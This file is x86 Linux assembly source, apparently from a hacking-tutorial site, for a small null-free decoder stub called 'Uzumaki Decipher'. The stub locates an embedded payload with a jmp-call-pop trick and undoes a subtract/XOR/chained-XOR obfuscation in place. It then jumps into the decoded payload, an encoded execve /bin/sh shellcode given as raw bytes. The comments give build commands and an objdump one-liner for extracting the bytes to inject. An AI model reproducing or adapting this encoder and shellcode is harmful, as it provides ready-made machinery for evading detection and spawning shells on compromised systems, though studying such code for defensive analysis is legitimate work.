; Uzumaki Decipher - Assembly Language - Linux/x86
; Copyright (C) 2013 Geyslan G. Bem, Hacking bits
;
;   http://hackingbits.com
;   geyslan@gmail.com
;
; This program is free software: you can redistribute it and/or modify
; it under the terms of the GNU General Public License as published by
; the Free Software Foundation, either version 3 of the License, or
; (at your option) any later version.
;
; This program is distributed in the hope that it will be useful,
; but WITHOUT ANY WARRANTY; without even the implied warranty of
; MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
; GNU General Public License for more details.
;
; You should have received a copy of the GNU General Public License
; along with this program.  If not, see <http://www.gnu.org/licenses/>.


;   uzumaki_decipher
;
;   * decipher has 29 bytes (the final amount depends on the shellcode length)
;   * null-free
;
;
;   # nasm -f elf32 uzumaki_decipher.asm
;   # ld -m elf_i386 uzumaki_decipher.o -o uzumaki_decipher
;   # for i in $(objdump -d uzumaki_decipher |grep "^ " |cut -f2); do echo -n '\x'$i; done;echo
;   
;   Testing
;   "This binary will not work, because it attempts to modify the text segment where relies the ciphed shellcode"
;   "To test, extract the shellcode of this compiled binary and launch it from another"


global _start

section .text

_start:
	sub ecx, ecx			; zero-ing ecx reg
	jz short shellcode		; always jumping to the shellcode (see flags affecteds by sub instruction - ZF)
mainflow:
	pop esi				; retrieving the shellcode address
	mov cl, 20			; adjusting the loop counter (shellcode length - 1)
decipher:
	inc esi				; analyzing the next offset
 	mov eax, dword [esi]		; copying bytes from offset to eax
	sub eax, 1			; subtracting ciphed byte of defined static value (ADD)
	xor al, 0xcc			; xoring ciphed byte with defined static value (XOR)
	xor al, byte [esi - 1]		; xoring ciphed byte with pseudorandom key value (deciphed previous byte)
	
	mov byte [esi], al		; replacing the ciphed byte by the deciphed one
	loop decipher			; loop
	jmp short execve		; jmp to the shellcode when the loop ends
shellcode:
	call mainflow			; returning to the mainflow and putting the next eip into the stack
	; ciphed execve /bin/sh
        execve:	db 0x31,0x35,0xf3,0xdb,0x9e,0x78,0x97,0xf6,0x8c,0xcd
		db 0x91,0xd8,0xcd,0x8c,0x82,0xc8,0xcc,0x2c,0xa7,0xe3
		db 0x82
